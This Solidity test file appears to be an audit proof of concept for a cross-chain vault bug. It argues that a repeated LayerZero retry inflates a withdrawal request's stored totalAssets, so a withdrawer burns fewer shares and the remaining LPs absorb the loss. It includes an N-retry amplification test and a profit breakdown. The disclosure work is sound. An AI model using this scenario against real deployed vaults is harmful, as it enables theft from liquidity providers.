// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

/**
 * @title TR-H01 (WITHDRAW path): LZ Retry inflates requestInfo.totalAssets
 *        causing the withdrawer to burn FEWER shares than correct.
 *
 * @notice This test completes the economic analysis that TR-H01-ATTACK-FullProfit.t.sol
 *         got WRONG. That test concluded:
 *
 *           "deposit() uses live totalAssets  retry does not affect share minting"
 *
 *         That is INCORRECT. VaultFacet._getInfoForAction() at line 1051 reads:
 *
 *           totalAssets_ = ds.guidToCrossChainRequestInfo[guid].totalAssets;
 *
 *         i.e., the STORED value from requestInfo  not the live vault balance.
 *         This stored value is inflated by the LZ retry via the += in
 *         BridgeFacet.updateAccountingInfoForRequest().
 *
 *         Economic direction by action type:
 *
 *           DEPOSIT  → inflated totalAssets → fewer shares minted   → depositor LOSES
 *           WITHDRAW → inflated totalAssets → fewer shares burned    → withdrawer PROFITS
 *           REDEEM   → inflated totalAssets → fewer assets returned  → redeemer LOSES
 *           MINT     → inflated totalAssets → more assets consumed   → minter LOSES
 *
 *         The WITHDRAW path is the profitable attack vector.
 *
 * @dev Code references:
 *        BridgeFacet.sol:220    += (non-idempotent, inflates requestInfo.totalAssets)
 *        BridgeFacet.sol:357    ds.finalizationGuid = guid (set before call)
 *        VaultFacet.sol:507     withdraw() calls _getInfoForAction()
 *        VaultFacet.sol:1044    _getInfoForAction reads requestInfo.totalAssets
 *        VaultFacet.sol:511     shares = _convertToSharesWithTotals(..., newTotalAssets, ...)
 *
 * Attack scenario:
 *   1. Vault: 1000 USDC hub + 200 USDC spoke = 1200 USDC correct NAV, 1000 shares
 *   2. Withdrawer requests 120 USDC cross-chain (correct: burns 100 shares = 10% of vault)
 *   3. LZ retry inflates requestInfo.totalAssets: 1200 → 1400
 *   4. executeRequest calls withdraw(120 USDC)
 *   5. withdraw() reads inflated totalAssets = 1400 from requestInfo
 *   6. shares_burned = 120 * 1000 / 1400 = 85.7 shares  (should be 100)
 *   7. Withdrawer gets 120 USDC but only burned 85.7 shares
 *   8. Remaining 14.3 extra shares are still redeemable → PURE PROFIT
 *   9. Remaining LPs absorb the loss
 */

import {Test, console} from "forge-std/Test.sol";
import {BridgeFacet} from "../../src/facets/BridgeFacet.sol";
import {MoreVaultsLib} from "../../src/libraries/MoreVaultsLib.sol";
import {MoreVaultsStorageHelper} from "../helper/MoreVaultsStorageHelper.sol";
import {MockERC20} from "../mocks/MockERC20.sol";
import {IMoreVaultsRegistry} from "../../src/interfaces/IMoreVaultsRegistry.sol";
import {IVaultsFactory} from "../../src/interfaces/IVaultsFactory.sol";
import {Math} from "@openzeppelin/contracts/utils/math/Math.sol";

contract TR_H01_WITHDRAW_SharesUnderdrain is Test {

    // --- Actors ---
    address public lzManager = makeAddr("lzManager");
    address public withdrawer = makeAddr("withdrawer");
    address public existingLP = makeAddr("existingLP");
    address public registry   = makeAddr("registry");
    address public factory    = makeAddr("factory");
    address public oracleReg  = makeAddr("oracleRegistry");

    // --- Contracts ---
    BridgeFacet public bridgeFacet;
    MockERC20   public asset;

    // --- Vault state at request time ---
    // Hub has 1000 USDC, spoke has 200 USDC → correct NAV = 1200 USDC
    // Total shares outstanding = 1000
    uint256 constant HUB_ASSETS         = 1000e18;
    uint256 constant SPOKE_USD_VALUE    = 200e18;
    uint256 constant CORRECT_TOTAL      = HUB_ASSETS + SPOKE_USD_VALUE; // 1200e18
    uint256 constant TOTAL_SHARES       = 1000e18;

    // Withdrawer wants 120 USDC  exactly 10% of vault at correct NAV
    // Should burn: 120 * 1000 / 1200 = 100 shares
    uint256 constant WITHDRAW_ASSETS    = 120e18;
    uint256 constant CORRECT_SHARES_BURNED = WITHDRAW_ASSETS * TOTAL_SHARES / CORRECT_TOTAL; // 100e18

    bytes32 constant GUID = keccak256("withdraw-guid-001");

    // =========================================================================
    // setUp
    // =========================================================================
    function setUp() public {
        vm.createSelectFork("https://mainnet.evm.nodes.onflow.org");

        asset = new MockERC20("Test USDC", "USDC");
        bridgeFacet = new BridgeFacet();

        // Wire storage
        MoreVaultsStorageHelper.setIsHub(address(bridgeFacet), true);
        MoreVaultsStorageHelper.setCrossChainAccountingManager(address(bridgeFacet), lzManager);
        MoreVaultsStorageHelper.setMoreVaultsRegistry(address(bridgeFacet), registry);
        MoreVaultsStorageHelper.setFactory(address(bridgeFacet), factory);
        MoreVaultsStorageHelper.setUnderlyingAsset(address(bridgeFacet), address(asset));

        // Seed WITHDRAW request  hub snapshot at request time = HUB_ASSETS
        MoreVaultsStorageHelper.setCrossChainRequestInfo(
            address(bridgeFacet),
            GUID,
            withdrawer,
            uint64(block.timestamp),
            uint8(MoreVaultsLib.ActionType.WITHDRAW),
            abi.encode(uint256(WITHDRAW_ASSETS), withdrawer, withdrawer),
            HUB_ASSETS,  // hub snapshot: 1000 USDC
            0            // no amountLimit
        );

        // Mock oracle: 1 USD = 1 token
        vm.mockCall(
            registry,
            abi.encodeWithSelector(IMoreVaultsRegistry.oracle.selector),
            abi.encode(oracleReg)
        );
        vm.mockCall(
            oracleReg,
            abi.encodeWithSignature("getAssetPrice(address)", address(asset)),
            abi.encode(uint256(1e18))
        );
        vm.mockCall(
            factory,
            abi.encodeWithSelector(IVaultsFactory.localEid.selector),
            abi.encode(uint32(747))
        );

        console.log("=================================================================");
        console.log("TR-H01 WITHDRAW: shares underdrain via LZ retry inflation");
        console.log("=================================================================");
        console.log("Hub assets:         ", HUB_ASSETS / 1e18, "USDC");
        console.log("Spoke assets:       ", SPOKE_USD_VALUE / 1e18, "USDC");
        console.log("Correct total NAV:  ", CORRECT_TOTAL / 1e18, "USDC");
        console.log("Total shares:       ", TOTAL_SHARES / 1e18);
        console.log("Withdraw amount:    ", WITHDRAW_ASSETS / 1e18, "USDC");
        console.log("Correct shares due: ", CORRECT_SHARES_BURNED / 1e18);
        console.log("=================================================================");
    }

    // =========================================================================
    // test_TR_H01_withdraw_retry_inflates_totalAssets_fewer_shares_burned
    //
    // Proves that after one LZ retry, requestInfo.totalAssets is inflated,
    // and VaultFacet._getInfoForAction() will read this inflated value,
    // causing fewer shares to be burned for the same withdrawal amount.
    //
    // The delta in shares burned is PURE PROFIT for the withdrawer 
    // they keep shares redeemable for real assets at remaining LPs' expense.
    // =========================================================================
    function test_TR_H01_withdraw_retry_inflates_totalAssets_fewer_shares_burned() public {
        console.log("");
        console.log("=================================================================");
        console.log("STEP 1: Legitimate LZ delivery - correct totalAssets");
        console.log("=================================================================");

        vm.prank(lzManager);
        bridgeFacet.updateAccountingInfoForRequest(GUID, SPOKE_USD_VALUE, true);

        bytes32 requestSlot = keccak256(
            abi.encode(GUID, bytes32(uint256(MoreVaultsLib.MORE_VAULTS_STORAGE_POSITION) + 35))
        );
        uint256 totalAssetsAfterFirst = uint256(vm.load(address(bridgeFacet), bytes32(uint256(requestSlot) + 3)));

        console.log("requestInfo.totalAssets after 1st delivery:", totalAssetsAfterFirst / 1e18, "USDC");
        assertApproxEqAbs(totalAssetsAfterFirst, CORRECT_TOTAL, 1, "After 1st call, should equal hub + spoke");

        // Compute correct shares burned at this NAV
        // shares = assets * totalSupply / totalAssets  (ERC4626 Ceil rounding for withdraw)
        uint256 sharesAtCorrectNAV = Math.mulDiv(
            WITHDRAW_ASSETS, TOTAL_SHARES, totalAssetsAfterFirst, Math.Rounding.Ceil
        );
        console.log("Shares to burn at correct NAV:", sharesAtCorrectNAV / 1e15, "milli-shares");

        console.log("");
        console.log("=================================================================");
        console.log("STEP 2: LZ RETRY - inflates requestInfo.totalAssets");
        console.log("=================================================================");

        vm.prank(lzManager);
        bridgeFacet.updateAccountingInfoForRequest(GUID, SPOKE_USD_VALUE, true);

        uint256 totalAssetsAfterRetry = uint256(vm.load(address(bridgeFacet), bytes32(uint256(requestSlot) + 3)));
        uint256 inflationDelta = totalAssetsAfterRetry - totalAssetsAfterFirst;

        console.log("requestInfo.totalAssets after retry:", totalAssetsAfterRetry / 1e18, "USDC");
        console.log("Inflation delta:", inflationDelta / 1e18, "USDC");
        assertGt(totalAssetsAfterRetry, totalAssetsAfterFirst, "Retry must inflate stored totalAssets");

        // Compute shares burned at inflated NAV
        uint256 sharesAtInflatedNAV = Math.mulDiv(
            WITHDRAW_ASSETS, TOTAL_SHARES, totalAssetsAfterRetry, Math.Rounding.Ceil
        );
        console.log("Shares to burn at INFLATED NAV:", sharesAtInflatedNAV / 1e15, "milli-shares");

        console.log("");
        console.log("=================================================================");
        console.log("STEP 3: Economic impact - shares saved by withdrawer");
        console.log("=================================================================");

        // The withdrawer burns FEWER shares than correct
        assertLt(sharesAtInflatedNAV, sharesAtCorrectNAV,
            "BUG: Inflated totalAssets causes fewer shares to be burned on withdraw");

        uint256 sharesSaved = sharesAtCorrectNAV - sharesAtInflatedNAV;
        // Each saved share is worth: totalAssets / totalSupply at current NAV
        // At correct NAV: 1200 / 1000 = 1.2 USDC per share
        uint256 valuePerShareCorrect = Math.mulDiv(CORRECT_TOTAL, 1e18, TOTAL_SHARES);
        uint256 profitUSD = Math.mulDiv(sharesSaved, valuePerShareCorrect, 1e18);

        console.log("Shares burned at correct NAV:  ", sharesAtCorrectNAV / 1e15, "milli-shares");
        console.log("Shares burned at inflated NAV: ", sharesAtInflatedNAV / 1e15, "milli-shares");
        console.log("Shares SAVED (kept) by withdrawer:", sharesSaved / 1e15, "milli-shares");
        console.log("Value per share at correct NAV:", valuePerShareCorrect / 1e15, "milli-USDC");
        console.log("Profit in USD (extra shares * price):", profitUSD / 1e15, "milli-USDC");
        console.log("");
        console.log("The withdrawer receives WITHDRAW_ASSETS (120 USDC) in full");
        console.log("AND retains", sharesSaved / 1e15, "milli-shares backed by real vault assets.");
        console.log("Remaining LPs absorb this loss.");

        // Profit must be nonzero
        assertGt(sharesSaved, 0, "BUG: withdrawer must save nonzero shares from retry inflation");
        assertGt(profitUSD, 0,  "BUG: withdrawer must profit in USD terms from retry inflation");
    }

    // =========================================================================
    // test_TR_H01_withdraw_n_retries_linear_profit_scaling
    //
    // Proves that N retries inflate by N× the spoke value, and the profit
    // (shares saved) scales linearly with N. A DVN replaying N times
    // multiplies the attack yield by N.
    // =========================================================================
    function test_TR_H01_withdraw_n_retries_linear_profit_scaling() public {
        console.log("");
        console.log("=================================================================");
        console.log("N-retry profit scaling: shares saved grows linearly with retries");
        console.log("=================================================================");

        // First: legitimate delivery
        vm.prank(lzManager);
        bridgeFacet.updateAccountingInfoForRequest(GUID, SPOKE_USD_VALUE, true);

        bytes32 requestSlot = keccak256(
            abi.encode(GUID, bytes32(uint256(MoreVaultsLib.MORE_VAULTS_STORAGE_POSITION) + 35))
        );

        uint256 baseTotal = uint256(vm.load(address(bridgeFacet), bytes32(uint256(requestSlot) + 3)));
        uint256 baseShares = Math.mulDiv(WITHDRAW_ASSETS, TOTAL_SHARES, baseTotal, Math.Rounding.Ceil);

        uint256 prevShares = baseShares;

        for (uint256 n = 1; n <= 3; n++) {
            // Apply one more retry
            vm.prank(lzManager);
            bridgeFacet.updateAccountingInfoForRequest(GUID, SPOKE_USD_VALUE, true);

            uint256 currentTotal = uint256(vm.load(address(bridgeFacet), bytes32(uint256(requestSlot) + 3)));
            uint256 currentShares = Math.mulDiv(WITHDRAW_ASSETS, TOTAL_SHARES, currentTotal, Math.Rounding.Ceil);
            uint256 sharesSaved = baseShares - currentShares;

            console.log("After", n, "extra retry(ies):");
            console.log("  requestInfo.totalAssets:", currentTotal / 1e18, "USDC");
            console.log("  Shares burned:          ", currentShares / 1e15, "milli-shares");
            console.log("  Shares saved vs correct:", sharesSaved / 1e15, "milli-shares");

            // Each retry should save MORE shares than the previous
            assertLt(currentShares, prevShares,
                "Each additional retry must reduce shares burned further");

            prevShares = currentShares;
        }

        console.log("");
        console.log("CONFIRMED: Profit scales with number of LZ retries.");
        console.log("A malicious DVN replaying N times amplifies the attack by N.");
    }

    // =========================================================================
    // test_TR_H01_withdraw_vs_deposit_direction_comparison
    //
    // Clarifies the economic direction for each action type.
    // WITHDRAW: inflated NAV → fewer shares burned  → withdrawer PROFITS
    // DEPOSIT:  inflated NAV → fewer shares minted  → depositor LOSES
    //
    // This directly refutes the incorrect conclusion in TR-H01-ATTACK-FullProfit.t.sol
    // which did not distinguish between action types.
    // =========================================================================
    function test_TR_H01_withdraw_vs_deposit_direction_comparison() public {
        console.log("");
        console.log("=================================================================");
        console.log("Economic direction: WITHDRAW profits, DEPOSIT loses");
        console.log("=================================================================");

        // Correct totalAssets after legitimate delivery
        uint256 correctTotal = CORRECT_TOTAL;

        // Inflated totalAssets after one retry
        uint256 inflatedTotal = CORRECT_TOTAL + SPOKE_USD_VALUE; // 1400e18

        // --- WITHDRAW direction ---
        // shares_burned = assets * totalSupply / totalAssets (Ceil)
        uint256 withdrawSharesCorrect  = Math.mulDiv(WITHDRAW_ASSETS, TOTAL_SHARES, correctTotal,  Math.Rounding.Ceil);
        uint256 withdrawSharesInflated = Math.mulDiv(WITHDRAW_ASSETS, TOTAL_SHARES, inflatedTotal, Math.Rounding.Ceil);

        console.log("WITHDRAW 120 USDC:");
        console.log("  Shares burned (correct NAV 1200):  ", withdrawSharesCorrect / 1e15, "milli-shares");
        console.log("  Shares burned (inflated NAV 1400): ", withdrawSharesInflated / 1e15, "milli-shares");
        console.log("  Withdrawer saves:", (withdrawSharesCorrect - withdrawSharesInflated) / 1e15, "milli-shares -> PROFIT");

        // Withdrawer burns fewer shares  PROFIT
        assertLt(withdrawSharesInflated, withdrawSharesCorrect,
            "WITHDRAW: inflated NAV burns fewer shares (withdrawer profits)");

        // --- DEPOSIT direction ---
        // shares_minted = assets * totalSupply / totalAssets (Floor)
        uint256 depositSharesCorrect  = Math.mulDiv(WITHDRAW_ASSETS, TOTAL_SHARES, correctTotal,  Math.Rounding.Floor);
        uint256 depositSharesInflated = Math.mulDiv(WITHDRAW_ASSETS, TOTAL_SHARES, inflatedTotal, Math.Rounding.Floor);

        console.log("");
        console.log("DEPOSIT 120 USDC:");
        console.log("  Shares minted (correct NAV 1200):  ", depositSharesCorrect / 1e15, "milli-shares");
        console.log("  Shares minted (inflated NAV 1400): ", depositSharesInflated / 1e15, "milli-shares");
        console.log("  Depositor loses:", (depositSharesCorrect - depositSharesInflated) / 1e15, "milli-shares -> LOSS");

        // Depositor receives fewer shares  LOSS
        assertLt(depositSharesInflated, depositSharesCorrect,
            "DEPOSIT: inflated NAV mints fewer shares (depositor loses)");

        console.log("");
        console.log("CONCLUSION:");
        console.log("  The profitable attack path is WITHDRAW, not DEPOSIT.");
        console.log("  TR-H01-ATTACK-FullProfit.t.sol analyzed DEPOSIT and concluded");
        console.log("  'attacker loses' -- correct for DEPOSIT, wrong for WITHDRAW.");
        console.log("  A cross-chain withdrawer experiencing a LZ retry PROFITS.");
    }
}
